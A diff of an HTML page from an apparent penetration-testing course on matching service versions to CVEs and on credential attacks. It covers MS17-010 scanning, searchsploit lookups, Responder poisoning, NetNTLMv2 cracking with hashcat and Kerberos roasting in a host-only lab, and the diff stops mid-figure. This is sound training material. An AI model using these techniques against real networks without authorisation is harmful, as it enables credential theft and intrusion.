@@ -65,7 +65,7 @@
          a <strong>vulnerability</strong> and a <strong>credential</strong> — and for the first time you attack a real domain.</p>
     </div>
     <div class="content">
-      <div class="oneline">Attackers don't break in — they log in. Session 3 found and enumerated the doors.
+      <div class="oneline"><strong class="hl">Attackers don't break in — they log in.</strong> Session 3 found and enumerated the doors.
         Session 4 is where you get the keys: match a version to a known weakness, then crack, spray, poison and
         roast your way to a working credential — every step loud in the auth logs, so every step carries its SOC flip.</div>
 
@@ -85,8 +85,8 @@
           <tr><td>8</td><td><strong>Lab 2</strong> — a vuln scan, and the "critical" that's a false positive</td><td>Hands-on demo</td><td>8</td></tr>
           <tr><td colspan="4" class="mono" style="color:#ff7043">— Half B · Authentication &amp; Password Attacks (the domain) —</td></tr>
           <tr><td>9</td><td>Authentication + hashing vs encryption vs encoding</td><td>Theory</td><td>9</td></tr>
-          <tr><td>10</td><td>Where creds live + <strong>NTLM challenge-response</strong> (animated)</td><td>Theory</td><td>10</td></tr>
-          <tr><td>11</td><td><strong>Kerberos ticket flow</strong> (animated) + the two bleed points</td><td>Theory</td><td>10</td></tr>
+          <tr><td>10</td><td>Where creds live + <strong>NTLM challenge-response</strong> (step through)</td><td>Theory</td><td>10</td></tr>
+          <tr><td>11</td><td><strong>Kerberos ticket flow</strong> (step through) + the two bleed points</td><td>Theory</td><td>10</td></tr>
           <tr><td>12</td><td>Password-attack taxonomy + the hash-cracking pipeline</td><td>Theory</td><td>9</td></tr>
           <tr><td>—</td><td>Break</td><td>—</td><td>10</td></tr>
           <tr><td>13</td><td>Offline cracking — <code>hashcat</code> + <code>john</code></td><td>Theory</td><td>8</td></tr>
@@ -192,7 +192,7 @@
           <!-- converge to s5 -->
           <path d="M770,150 L808,150" fill="none" stroke="#e63946" stroke-width="1.8" marker-end="url(#ar-r)"/>
         </svg>
-        <figcaption><b>Two questions, one answer.</b> Vulnerability analysis and credential attacks converge on a single
+        <figcaption><b class="hl">Two questions, one answer.</b> Vulnerability analysis and credential attacks converge on a single
            chosen way in per host — the access plan — which is exactly what Session 5 turns into a shell.</figcaption>
       </figure>
 
@@ -258,7 +258,7 @@
 
       <ol class="steps">
         <li>
-          <strong>All five VMs on the host-only network</strong>, and the DC reachable.
+          <strong class="hl">All five VMs on the host-only network</strong>, and the DC reachable.
           <pre><code># from Kali
 ip a | grep -A2 'ens\|eth'                    # your host-only IP
 sudo nmap -sn 192.168.56.0/24                 # expect Kali + MSF2 + Win7 + Win10 + DC
@@ -387,7 +387,7 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
         </svg>
         <div class="dgm-hint">Click each stage — what it is, and where it can dead-end.</div>
         <div class="dgm-detail" data-detail="svc"><h5><span class="dd-tag">STAGE 1</span>Service + version</h5><p><b>The input, taken verbatim from your profile.</b> Precision matters — <span class="mono">vsftpd 2.3.4</span> has a backdoor; <span class="mono">2.3.5</span> does not. A wrong or fuzzy version (an <span class="mono">-sV</span> guess of <span class="mono">tcpwrapped</span>) sends you down the wrong CVE and wastes the session. Confirm the version by hand if the scanner hedged.</p></div>
-        <div class="dgm-detail" data-detail="cve"><h5><span class="dd-tag">STAGE 2</span>CVE — the identifier</h5><p><b>A CVE is a catalogue number for one specific flaw</b> (e.g. <span class="mono">CVE-2017-0144</span> = EternalBlue). It is not a score and not an exploit — just a globally-agreed name so everyone means the same bug. You find them by searching the version string in the NVD / MITRE / vendor advisories.</p></div>
+        <div class="dgm-detail" data-detail="cve"><h5><span class="dd-tag">STAGE 2</span>CVE — the identifier</h5><p><b class="hl">A CVE is a catalogue number for one specific flaw</b> (e.g. <span class="mono">CVE-2017-0144</span> = EternalBlue). It is not a score and not an exploit — just a globally-agreed name so everyone means the same bug. You find them by searching the version string in the NVD / MITRE / vendor advisories.</p></div>
         <div class="dgm-detail" data-detail="cvss"><h5><span class="dd-tag">STAGE 3</span>CVSS — how bad</h5><p><b>A 0–10 severity score with a vector behind it.</b> It tells you <em>priority</em>, not <em>reachability</em> — a 9.8 that needs local access you don't have is lower value to you right now than a 7.5 you can reach over the network. Read the vector, not just the number (next page).</p></div>
         <div class="dgm-detail" data-detail="exploit"><h5><span class="dd-tag">STAGE 4</span>Does a public exploit exist?</h5><p><b>The make-or-break question.</b> A scary CVE with no working exploit is a report line; one with a Metasploit module or an Exploit-DB PoC is a way in. <span class="mono">searchsploit</span> and Exploit-DB answer it in seconds. This is where the funnel narrows hardest — most CVEs never get a reliable public exploit.</p></div>
         <div class="dgm-detail" data-detail="poc"><h5><span class="dd-tag">STAGE 5</span>PoC ready</h5><p><b>You have located a proof-of-concept</b> and read enough of it to know its target, its requirements, and its blast radius. You do <em>not</em> run it here — you record it in the access plan. Firing an exploit you haven't read is how a pentest becomes an outage.</p></div>
@@ -476,7 +476,7 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
   <text class="d-lbl" x="30" y="414" font-size="15" style="fill:var(--text-3)">Network-reachable (AV:N), no privileges or user click (PR:N / UI:N), full C/I/A loss. Only AC:H (a heap-grooming</text>
   <text class="d-lbl" x="30" y="438" font-size="15" style="fill:var(--text-3)">trick) holds it under 9 — and Metasploit does that trick for you. Read the vector, not just the number.</text>
 </svg>
-        <figcaption><b>The vector is the actionable part.</b> Two vulns can both score 8.1; the one with <span class="mono">AV:N/PR:N/UI:N</span> is the one you reach from your Kali box without touching the victim's keyboard.</figcaption>
+        <figcaption><b class="hl">The vector is the actionable part.</b> Two vulns can both score 8.1; the one with <span class="mono">AV:N/PR:N/UI:N</span> is the one you reach from your Kali box without touching the victim's keyboard.</figcaption>
       </figure>
 
       <div class="tbl-scroll">
@@ -484,6 +484,21 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
         <thead><tr><th>Score</th><th>0.0</th><th>0.1–3.9</th><th>4.0–6.9</th><th>7.0–8.9</th><th>9.0–10.0</th></tr></thead>
         <tbody><tr><td><strong>Severity</strong></td><td>None</td><td>Low</td><td>Medium</td><td>High</td><td>Critical</td></tr></tbody>
       </table>
+      </div>
+
+      <h2><span class="h-t">The same CVE in the real tools — CVE-2017-0144</span></h2>
+      <p>One vulnerability from your enumeration, read end to end in the actual sources: the <strong>NVD</strong> entry (the
+         score and the vector) and the <strong>FIRST CVSS calculator</strong> (the vector, metric by metric). This is
+         MS17-010 / EternalBlue — the CVE you will <em>fire</em> in Session 5.</p>
+      <div class="split">
+        <figure class="shot">
+          <img src="assets/img/nvd-cve-2017-0144.jpg" alt="NVD detail page for CVE-2017-0144: description of the SMBv1 remote code execution flaw and a CVSS 3.x base score of 8.8 HIGH with the vector CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H">
+          <figcaption><b>NVD — the catalogue entry.</b> Base score <span class="mono">8.8 HIGH</span>, vector <span class="mono">AV:N/AC:L/PR:L/UI:N/…</span>. Network-reachable, low complexity — exactly why this one is dangerous. <em>(Live nvd.nist.gov capture.)</em></figcaption>
+        </figure>
+        <figure class="shot">
+          <img src="assets/img/cvss-calc-ms17010.jpg" alt="FIRST CVSS v3.1 calculator with the CVE-2017-0144 metrics selected (Attack Vector Network, Attack Complexity Low, etc.) producing a base score of 8.8 High">
+          <figcaption><b>CVSS calculator — where the number comes from.</b> Toggle a metric and watch <span class="mono">8.8</span> move. The <span class="hl">vector is the input, the score is the output</span>. <em>(Live first.org capture.)</em></figcaption>
+        </figure>
       </div>
 
       <div class="box tip">
@@ -512,7 +527,7 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
         <p>You have a version and maybe a CVE. Before you write "way in" in the access plan you need to know a working
            exploit exists. <span class="mono">searchsploit</span> checks a local copy of Exploit-DB in a second;
            <span class="mono">nmap --script vuln</span> asks the target itself. The pair teaches a real distinction:
-           <strong>research leaves no trace; checking the target does.</strong></p>
+           <strong class="hl hl-w">research leaves no trace; checking the target does.</strong></p>
       </div>
 
       <figure class="dgm interactive">
@@ -551,6 +566,14 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
   </div>
   <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note"><b>Offline &amp; silent</b> — a local Exploit-DB copy. The target never sees it.</span></div>
 </div>
+
+      <h2><span class="h-t">What a hit actually points to — the Exploit-DB entry</span></h2>
+      <p>A <span class="mono">searchsploit</span> line is a pointer into Exploit-DB. Follow one and this is the record —
+         here the MS17-010 / EternalBlue exploit you matched against Windows 7. Read the header <em>before</em> you run it.</p>
+      <figure class="shot">
+        <img src="assets/img/exploitdb-42315.jpg" alt="Exploit-DB entry 42315 — EternalBlue SMB remote code execution for MS17-010: EDB-ID 42315, CVE-2017-0144, EDB Verified checkmark, Type REMOTE, Platform Windows, dated 2017-07-11">
+        <figcaption><b>"Does a public exploit exist?" — yes, and verified.</b> <span class="mono">EDB-ID 42315</span> · <span class="mono">CVE-2017-0144</span> · <span class="hl hl-d">EDB Verified ✓</span> · Type <span class="mono">REMOTE</span> · Windows. The green tick means someone confirmed it works — that is the difference between "a way in" and "a maybe." <em>(Live exploit-db.com capture.)</em></figcaption>
+      </figure>
 
       <h2 class="mono" style="color:#ff7043"><span class="h-t">searchsploit — the 7-part frame</span></h2>
       <div class="tbl-scroll">
@@ -645,7 +668,7 @@ searchsploit -m unix/remote/16320.rb   # mirror the Samba one to read it</code><
       <h2><span class="h-t">Step 2 — ask the Windows 7 target directly (the CVE→exploit bridge)</span></h2>
       <ol class="steps">
         <li>
-          <strong>Confirm MS17-010 with NSE</strong> — this is the one CVE you'll actually fire in Session 5.
+          <strong class="hl">Confirm MS17-010 with NSE</strong> — this is the one CVE you'll actually fire in Session 5.
           <pre><code>nmap -p445 --script smb-vuln-ms17-010 192.168.56.107
 # VULNERABLE:  ... (ms17-010)  IDs: CVE:CVE-2017-0143
 # CVSS 8.1 High · public exploit: YES (Metasploit exploit/windows/smb/ms17_010_eternalblue)</code></pre>
@@ -728,7 +751,7 @@ searchsploit samba 2.2         # → trans2open remote overflow
         <div class="dgm-detail" data-detail="raw"><h5><span class="dd-tag">STAGE 1</span>Raw findings</h5><p><b>What the scanner hands you</b> — every banner-matched CVE, sorted by its own confidence. Includes false positives (version mismatches) and criticals you can't reach. This is a to-do list, not a conclusion.</p></div>
         <div class="dgm-detail" data-detail="conf"><h5><span class="dd-tag">STAGE 2</span>Confirmed</h5><p><b>You checked the real version by hand</b> (nxc, netcat, the actual build). Drops the false positives where the scanner matched a banner that doesn't actually carry the flaw. This is where a "critical" often dies.</p></div>
         <div class="dgm-detail" data-detail="reach"><h5><span class="dd-tag">STAGE 3</span>Reachable</h5><p><b>Can you actually trigger it from where you are?</b> Read the CVSS vector — an <span class="mono">AV:N/PR:N</span> beats a 9.8 that needs local access you don't have. Priority for the client ≠ priority for your foothold.</p></div>
-        <div class="dgm-detail" data-detail="wayin"><h5><span class="dd-tag">STAGE 4</span>Ways in</h5><p><b>The handful that are real, reachable, and have a working exploit.</b> These go in the access plan. A scanner rarely surfaces these at the top — the judgement that finds them is the skill you're being paid for.</p></div>
+        <div class="dgm-detail" data-detail="wayin"><h5><span class="dd-tag">STAGE 4</span>Ways in</h5><p><b class="hl">The handful that are real, reachable, and have a working exploit.</b> These go in the access plan. A scanner rarely surfaces these at the top — the judgement that finds them is the skill you're being paid for.</p></div>
       </figure>
 
       <h2 class="mono" style="color:#ff7043"><span class="h-t">Nessus Essentials — the 7-part frame</span></h2>
@@ -813,7 +836,7 @@ searchsploit samba 2.2         # → trans2open remote overflow
     <div class="sim-row"><span class="sim-sev med">Medium</span><span class="sim-find">TLS 1.0 supported (BEAST)</span><span class="sim-cve">CVE-2011-3389</span></div>
     <div class="sim-row"><span class="sim-sev low">Info</span><span class="sim-find">Nessus scan information</span><span class="sim-cve">—</span></div>
   </div>
-  <div class="sim-cta"><span class="sim-note"><b>Confirm before you trust it</b> — cross-check each critical against your own version work.</span></div>
+  <div class="sim-cta"><span class="sim-note"><b class="hl hl-d">Confirm before you trust it</b> — cross-check each critical against your own version work.</span></div>
 </div>
           <div class="verify">
             <h4>✓ Verification — you can read the result</h4>
@@ -874,7 +897,7 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
 
       <h2><span class="h-t">Authentication in one line</span></h2>
       <p>Authentication is proving you are who you claim to be — with something you know (password), have (token, key),
-         or are (biometric). Passwords are the weak link, and the rule is universal: <strong>passwords are stored
+         or are (biometric). Passwords are the weak link, and the rule is universal: <strong class="hl">passwords are stored
          hashed, never in plaintext.</strong> Everything today is about getting at, or abusing, those stored or
          in-transit secrets.</p>
 
@@ -908,7 +931,7 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
           <text class="d-mono" x="656" y="168" font-size="11" fill="#ff7043">one-way · NO key</text>
           <text class="d-sub" x="656" y="196">Cannot be reversed — only guessed.</text>
         </svg>
-        <figcaption><b>Only one of these is one-way.</b> A hash can't be "decrypted" because there's no key and no inverse
+        <figcaption><b class="hl">Only one of these is one-way.</b> A hash can't be "decrypted" because there's no key and no inverse
            function. So attackers don't reverse it — they <em>guess</em> inputs, hash each guess, and compare.</figcaption>
       </figure>
 
@@ -933,7 +956,7 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
   <!-- ==========  P11 · WHERE CREDS LIVE + NTLM (ANIMATED)  ========== -->
   <section class="page" data-title="NTLM challenge-response">
     <div class="page-head">
-      <div class="kicker"><span class="snum">S04 · P11</span><span class="tag theory">Method · animated</span><span class="time">⏱ 10 min</span></div>
+      <div class="kicker"><span class="snum">S04 · P11</span><span class="tag theory">Method · step through</span><span class="time">⏱ 10 min</span></div>
       <h1>Where Credentials Live, and What Crosses the Wire</h1>
       <p class="lede">Three stores hold Windows secrets, and NTLM's challenge-response decides what an attacker on the
          network can actually grab.</p>
@@ -960,43 +983,55 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
       </table>
       </div>
 
-      <h2><span class="h-t">NTLM challenge-response — press play</span></h2>
-      <p>NTLM authenticates without sending the password <em>or</em> the NT hash across the network. Watch what actually
-         travels — because that's what Responder captures.</p>
+      <h2><span class="h-t">NTLM challenge-response — step through it</span></h2>
+      <p>NTLM authenticates <b>without</b> sending the password <em>or</em> the NT hash across the network. Step through the
+         exchange and watch exactly what travels — because <b>what travels is what Responder captures</b>.</p>
 
-      <figure class="dgm animate-run">
-        <svg viewBox="0 0 1560 440" role="img" aria-label="NTLM challenge-response sequence between client and server; an attacker running Responder answers the client and receives the response, which is the NetNTLMv2 artefact, not the NT hash.">
-  <!-- actors -->
-  <rect x="60" y="30" width="360" height="64" rx="9" fill="#1f2533" stroke="#22d3ee"></rect>
-  <text class="d-title" x="240" y="60" text-anchor="middle" font-size="18">Client</text>
-  <text class="d-lbl" x="240" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">holds the NT hash</text>
-  <rect x="1140" y="30" width="360" height="64" rx="9" fill="#1f2533" stroke="#4ade80"></rect>
-  <text class="d-title" x="1320" y="60" text-anchor="middle" font-size="18">Server / DC</text>
-  <text class="d-lbl" x="1320" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">knows the hash too</text>
-  <!-- lifelines -->
-  <line x1="240" y1="94" x2="240" y2="300" stroke="#333b4c" stroke-width="1.4"></line>
-  <line x1="1320" y1="94" x2="1320" y2="300" stroke="#333b4c" stroke-width="1.4"></line>
-  <!-- messages: label ABOVE, arrow below -->
-  <text class="d-mono" x="780" y="140" text-anchor="middle" font-size="15" fill="#a0aab6">1 · NEGOTIATE — “I want to authenticate”</text>
-  <path class="flow-line" d="M244,152 L1316,152" fill="none" stroke="#a0aab6" stroke-width="1.8" marker-end="url(#ar-g)"></path>
-  <text class="d-mono" x="780" y="196" text-anchor="middle" font-size="15" fill="#4ade80">2 · CHALLENGE — a random nonce</text>
-  <path class="flow-line" d="M1316,208 L244,208" fill="none" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"></path>
-  <text class="d-mono" x="780" y="252" text-anchor="middle" font-size="15" fill="#ff7043">3 · RESPONSE = f(NT hash, challenge)  →  this is NetNTLMv2</text>
-  <path class="flow-line" d="M244,264 L1316,264" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"></path>
-  <!-- attacker box lower-left, arrow drops in the clear left area -->
-  <path class="flow-line" d="M244,268 L244,344" fill="none" stroke="#ff7043" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#ar-o)"></path>
-  <rect x="60" y="346" width="420" height="72" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
-  <text class="d-title" x="270" y="376" text-anchor="middle" font-size="16" fill="#ff7043">Attacker (Responder)</text>
-  <text class="d-lbl" x="270" y="400" text-anchor="middle" font-size="14" style="fill:var(--text-3)">answers the name lookup → receives step 3</text>
-  <!-- note band right, no arrow crosses it -->
-  <rect x="560" y="352" width="940" height="60" rx="9" fill="#0d1218" stroke="#ff7043"></rect>
-  <text class="d-mono" x="1030" y="380" text-anchor="middle" font-size="15" fill="#ff7043">The NT hash NEVER crosses the wire —</text>
-  <text class="d-lbl" x="1030" y="401" text-anchor="middle" font-size="14" style="fill:var(--text-2)">Responder captures only the keyed NetNTLMv2 response → crack with hashcat -m 5600</text>
-</svg>
-        <button type="button" class="dgm-replay" data-replay>↻ Replay the exchange</button>
-        <figcaption><b>Responder captures the response, not the hash.</b> What you crack (mode <span class="mono">5600</span>)
-           is the <span class="mono">NetNTLMv2</span> keyed response — recover the password offline and you have the account.
-           The NT hash never left the client.</figcaption>
+      <figure class="dgm pktflow">
+        <svg viewBox="0 0 1040 412" role="img" aria-label="NTLM challenge-response stepped sequence: negotiate, a server challenge nonce, and a keyed response (NetNTLMv2); then an attacker running Responder answers the name lookup and receives the response, which is the NetNTLMv2 artefact, not the NT hash.">
+          <!-- actors -->
+          <rect x="50" y="40" width="300" height="52" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="200" y="66" text-anchor="middle" font-size="15">Client</text>
+          <text class="d-sub" x="200" y="84" text-anchor="middle">holds the NT hash</text>
+          <rect x="690" y="40" width="300" height="52" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="840" y="66" text-anchor="middle" font-size="15" fill="var(--green)">Server / DC</text>
+          <text class="d-sub" x="840" y="84" text-anchor="middle">knows the hash too</text>
+          <!-- lifelines -->
+          <line x1="200" y1="92" x2="200" y2="300" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="840" y1="92" x2="840" y2="300" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+            <text x="520" y="138" font-size="13" class="d-sub" text-anchor="middle" font-weight="600" fill="var(--text-2)">1 · NEGOTIATE — "I'd like to authenticate"</text>
+            <path d="M206,152 L834,152" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:26px">
+            <text x="520" y="193" font-size="13" text-anchor="middle" font-weight="600" fill="var(--green)">2 · CHALLENGE — a random nonce (public)</text>
+            <path d="M834,207 L206,207" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+            <text x="520" y="248" font-size="13" text-anchor="middle" font-weight="700" fill="var(--orange)">3 · RESPONSE = f(NT hash, nonce) = NetNTLMv2</text>
+            <path d="M206,262 L834,262" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+            <path d="M200,266 L200,332" fill="none" stroke="var(--orange)" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#ar-o)"/>
+            <rect x="40" y="336" width="380" height="64" rx="9" fill="var(--panel)" stroke="var(--orange)"/>
+            <text class="d-title" x="230" y="362" text-anchor="middle" font-size="14" fill="var(--orange)">Attacker · Responder</text>
+            <text class="d-sub" x="230" y="382" text-anchor="middle">answered the name lookup → receives step 3</text>
+            <rect x="470" y="336" width="520" height="64" rx="9" fill="#0d1218" stroke="var(--orange)"/>
+            <text x="730" y="362" text-anchor="middle" font-size="13" font-weight="700" fill="var(--orange)">The NT hash NEVER crosses the wire</text>
+            <text class="d-sub" x="730" y="383" text-anchor="middle">it grabs only the keyed NetNTLMv2 → crack offline, hashcat -m 5600</text>
+          </g>
+        </svg>
+        <div class="pf-ctl">
+          <button type="button" data-pf="prev">&#8249; Back</button>
+          <button type="button" data-pf="play">&#9654; Play</button>
+          <button type="button" data-pf="next">Next &#8250;</button>
+          <span class="pf-count"></span>
+        </div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The client announces it wants to authenticate with NTLM. Nothing secret has moved yet.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The server replies with a random <b>challenge (nonce)</b>. Also public — anyone sniffing sees it.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The client proves it knows the hash by <b>keying the nonce with the NT hash</b>. This keyed answer is the <b>NetNTLMv2</b> — and it is <i>all</i> that crosses the wire. The NT hash itself never leaves the client.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4 · where it bleeds</span>Responder poisons the name lookup so the client "authenticates" to the <b>attacker</b> instead. It captures the NetNTLMv2 from step 3 and cracks it offline (<span class="mono">hashcat -m 5600</span>). It never needs the NT hash — the keyed response is enough.</div>
+        <figcaption><b class="hl">Capture the response, not the hash.</b> NetNTLMv2 (mode <span class="mono">5600</span>, off the wire) is <em>not</em> the NT hash (mode <span class="mono">1000</span>, in the SAM). Same account, different artefacts, different modes.</figcaption>
       </figure>
 
       <div class="box key-takeaway">
@@ -1011,7 +1046,7 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
   <!-- ==========  P12 · KERBEROS (ANIMATED)  ========== -->
   <section class="page" data-title="Kerberos ticket flow">
     <div class="page-head">
-      <div class="kicker"><span class="snum">S04 · P12</span><span class="tag theory">Method · animated</span><span class="time">⏱ 10 min</span></div>
+      <div class="kicker"><span class="snum">S04 · P12</span><span class="tag theory">Method · step through</span><span class="time">⏱ 10 min</span></div>
       <h1>Kerberos, and Its Two Bleed Points</h1>
       <p class="lede">The modern Windows protocol is ticket-based — and it leaks in exactly two places, which are two
          of today's attacks.</p>
@@ -1025,45 +1060,63 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
            Learn the flow and AS-REP roasting and Kerberoasting stop being magic.</p>
       </div>
 
-      <h2><span class="h-t">The ticket flow — press play</span></h2>
-      <p>Kerberos uses a trusted third party, the <strong>KDC</strong> (Key Distribution Center, running on the DC), and
-         tickets instead of passwords. Three exchanges:</p>
+      <h2><span class="h-t">The ticket flow — step through it</span></h2>
+      <p>Kerberos uses a trusted third party, the <strong>KDC</strong> (Key Distribution Center, on the DC), and
+         <b>tickets</b> instead of passwords. Step through all five messages — the two that leak are steps 2 and 4.</p>
 
-      <figure class="dgm animate-run">
-        <svg viewBox="0 0 940 350" role="img" aria-label="Kerberos flow: AS-REQ and AS-REP grant a ticket-granting ticket, TGS-REQ and TGS-REP grant a service ticket, then the client presents the service ticket to the service. AS-REP roasting attacks the AS-REP; Kerberoasting attacks the TGS-REP.">
+      <figure class="dgm pktflow">
+        <svg viewBox="0 0 1040 392" role="img" aria-label="Kerberos stepped sequence across client, KDC and service: AS-REQ, AS-REP granting a TGT, TGS-REQ, TGS-REP granting a service ticket, then presenting the ticket to the service. AS-REP roasting attacks step 2; Kerberoasting attacks step 4.">
           <!-- actors -->
-          <rect x="40" y="150" width="140" height="56" rx="8" fill="#1f2533" stroke="#22d3ee"/>
-          <text class="d-title" x="110" y="174" text-anchor="middle" font-size="12.5">Client / user</text>
-          <text class="d-sub" x="110" y="192" text-anchor="middle">any domain user</text>
-          <rect x="760" y="60" width="150" height="60" rx="8" fill="#1f2533" stroke="#4ade80"/>
-          <text class="d-title" x="835" y="84" text-anchor="middle" font-size="12" fill="#4ade80">KDC (on the DC)</text>
-          <text class="d-sub" x="835" y="102" text-anchor="middle">AS + TGS</text>
-          <rect x="760" y="250" width="150" height="56" rx="8" fill="#1f2533" stroke="#768290"/>
-          <text class="d-title" x="835" y="274" text-anchor="middle" font-size="12">Service</text>
-          <text class="d-sub" x="835" y="292" text-anchor="middle">e.g. MSSQL (an SPN)</text>
-          <!-- AS exchange -->
-          <path class="flow-line" d="M182,158 L758,96" fill="none" stroke="#a0aab6" stroke-width="1.7" marker-end="url(#ar-g)"/>
-          <text class="d-lbl d-mono" x="360" y="120" font-size="11">1 · AS-REQ</text>
-          <path class="flow-line" d="M758,110 L182,172" fill="none" stroke="#4ade80" stroke-width="1.7" marker-end="url(#ar-grn)"/>
-          <text class="d-lbl d-mono" x="470" y="150" font-size="11" fill="#4ade80">2 · AS-REP → TGT</text>
-          <!-- TGS exchange -->
-          <path class="flow-line" d="M182,188 L758,240" fill="none" stroke="#a0aab6" stroke-width="1.7" marker-end="url(#ar-g)"/>
-          <text class="d-lbl d-mono" x="330" y="214" font-size="11">3 · TGS-REQ (present TGT, name an SPN)</text>
-          <path class="flow-line" d="M758,262 L182,200" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"/>
-          <text class="d-lbl d-mono" x="470" y="238" font-size="11" fill="#ff7043">4 · TGS-REP → service ticket</text>
-          <!-- present to service -->
-          <path class="flow-line" d="M150,206 C150,300 500,320 758,290" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
-          <text class="d-lbl d-mono" x="360" y="332" font-size="11">5 · present service ticket → access</text>
-          <!-- bleed point badges -->
-          <rect x="470" y="44" width="250" height="26" rx="6" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-mono" x="595" y="62" text-anchor="middle" font-size="10.5" fill="#ff7043">BLEED 1 · AS-REP roast (no pre-auth)</text>
-          <rect x="250" y="250" width="250" height="26" rx="6" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-mono" x="375" y="268" text-anchor="middle" font-size="10.5" fill="#ff7043">BLEED 2 · Kerberoast (any user)</text>
+          <rect x="55" y="34" width="190" height="52" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="150" y="58" text-anchor="middle" font-size="14">Client / user</text>
+          <text class="d-sub" x="150" y="76" text-anchor="middle">any domain user</text>
+          <rect x="425" y="34" width="190" height="52" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="520" y="58" text-anchor="middle" font-size="14" fill="var(--green)">KDC (on the DC)</text>
+          <text class="d-sub" x="520" y="76" text-anchor="middle">AS + TGS</text>
+          <rect x="795" y="34" width="190" height="52" rx="9" fill="var(--panel-2)" stroke="var(--line-soft)"/>
+          <text class="d-title" x="890" y="58" text-anchor="middle" font-size="14">Service</text>
+          <text class="d-sub" x="890" y="76" text-anchor="middle">e.g. MSSQL (an SPN)</text>
+          <!-- lifelines -->
+          <line x1="150" y1="86" x2="150" y2="360" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="520" y1="86" x2="520" y2="360" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="890" y1="86" x2="890" y2="360" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+            <text x="335" y="126" font-size="12.5" class="d-sub" text-anchor="middle" font-weight="600" fill="var(--text-2)">1 · AS-REQ — prove identity (timestamp keyed with your hash)</text>
+            <path d="M156,140 L514,140" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:26px">
+            <text x="335" y="178" font-size="12.5" text-anchor="middle" font-weight="700" fill="var(--green)">2 · AS-REP → TGT (keyed with YOUR hash)</text>
+            <path d="M514,192 L156,192" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+            <rect x="548" y="176" width="330" height="24" rx="6" fill="var(--panel)" stroke="var(--orange)"/>
+            <text x="713" y="192" text-anchor="middle" font-size="10.5" font-weight="700" fill="var(--orange)">BLEED 1 · AS-REP roast (if no pre-auth)</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+            <text x="335" y="230" font-size="12.5" class="d-sub" text-anchor="middle" font-weight="600" fill="var(--text-2)">3 · TGS-REQ — present TGT, name an SPN</text>
+            <path d="M156,244 L514,244" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+            <text x="335" y="282" font-size="12.5" text-anchor="middle" font-weight="700" fill="var(--orange)">4 · TGS-REP → service ticket (keyed with the SERVICE hash)</text>
+            <path d="M514,296 L156,296" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+            <rect x="548" y="280" width="330" height="24" rx="6" fill="var(--panel)" stroke="var(--orange)"/>
+            <text x="713" y="296" text-anchor="middle" font-size="10.5" font-weight="700" fill="var(--orange)">BLEED 2 · Kerberoast (any user, any SPN)</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+            <text x="520" y="336" font-size="12.5" class="d-sub" text-anchor="middle" font-weight="600" fill="var(--text-2)">5 · present the service ticket → access granted</text>
+            <path d="M156,350 L884,350" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
         </svg>
-        <button type="button" class="dgm-replay" data-replay>↻ Replay the ticket flow</button>
